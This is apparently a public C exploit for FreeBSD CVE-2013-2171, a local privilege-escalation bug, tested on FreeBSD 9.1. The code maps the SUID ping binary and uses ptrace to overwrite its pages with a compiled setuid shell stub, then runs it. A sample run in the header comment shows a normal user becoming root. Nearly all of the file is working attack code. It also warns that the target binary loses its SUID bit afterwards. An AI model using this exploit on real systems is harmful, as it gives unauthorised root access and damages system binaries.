/**
 * FreeBSD privilege escalation CVE-2013-2171 (credits Konstantin Belousov & Alan Cox)
 *
 * tested on FreeBSD 9.1
 * ref: http://www.freebsd.org/security/advisories/FreeBSD-SA-13:06.mmap.asc
 *
 * @_hugsy_
 *
 * Syntax : 
 $ id
 uid=1001(user) gid=1001(user) groups=1001(user)
 $ gcc -Wall ./mmap.c && ./a.out
 [+] Saved old '/sbin/ping'
 [+] Using mmap-ed area at 0x281a4000
 [+] Attached to 3404
 [+] Copied 4917 bytes of payload to '/sbin/ping'
 [+] Triggering payload
# id
uid=0(root) gid=0(wheel) egid=1001(user) groups=1001(user),0(wheel)
 *
 * Note : TARGET (default /sbin/ping) will lose its SUID bit on restore, must be restored by hand
 * 
 */
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/ptrace.h>  
#include <sys/wait.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>

#define LEN    1000*getpagesize()
//#define TARGET "/sbin/ping"  // will lose its SUID bit on restore, must be restored by hand
#define TARGET "/bin/ping"  // will lose its SUID bit on restore, must be restored by hand

void kaboom(int pid, caddr_t addr)
{
    int nb, i, a, fd, n;
    char buf[60000] = {0,}; 

    a = i = 0;  
    fd = open(TARGET, O_RDONLY);
    nb = read(fd, buf, 60000);
    close(fd);
    printf("[+] Saved old '%s'\n", TARGET);
    printf("[+] Using mmap-ed area at %p\n", addr);

    if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
        perror("[-] ptrace(PT_ATTACH) failed");
        return;
    }
    printf("[+] Attached to %d\n", pid);
    wait(NULL);

    fd = open("./sc.c", O_WRONLY|O_CREAT,  S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);
    write(fd, "#include <stdio.h>\nmain(){ char* s[]={\"/bin/sh\",NULL};setuid(0);execve(s[0],s,0); }\n",84);
    close(fd);
    if (system("gcc -o ./sc ./sc.c") != 0) {
        perror("[-] gcc");
        return;
    }

    fd = open("./sc", O_RDONLY);  
    while (1) {
        int a;
        int n = read(fd, &a, sizeof(int));
        if (n <= 0) 
          break;

        //if (ptrace(PT_WRITE_D, pid, addr+i, a) < 0) {
        if (ptrace(PTRACE_POKETEXT, pid, addr+i, a) < 0) {
            perror("[-] ptrace(PT_WRITE_D) failed");
            return;
        }

        i+=n;
    }  
    close(fd);
    printf("[+] Copied %d bytes of payload to '%s'\n", i, TARGET);

    printf("[+] Triggering payload\n");
    system(TARGET);
    printf("[+] Restoring '%s'\n", TARGET);

    for (n=0, i=0; n<nb; n++) {
        if (ptrace(PTRACE_POKETEXT, pid, addr+n, *(buf+n)) < 0) {
            perror("[-] ptrace(PT_WRITE_D) failed");
            return;
        }                                           
    }
    ptrace(PTRACE_DETACH, pid, 0, 0);
    printf("[+] Done\n");

    return;
}

void dummy(int fd, caddr_t addr)
{
    sleep(1); 
    munmap(addr, LEN);
    close(fd);  
    return;
}

int main(int argc, char** argv, char** envp)
{
    int fd = open(TARGET, O_RDONLY);
    caddr_t addr = mmap(NULL, LEN, PROT_READ, MAP_SHARED, fd, 0);

    pid_t forked_pid = fork();
    switch(forked_pid) {
        case -1:
            return -1;
        case 0:
            dummy(fd, addr);
            break;
        default:
            munmap(addr, LEN);
            close(fd);

            kaboom(forked_pid, addr);
            wait(NULL);
            break;
    }

    return 0;
}

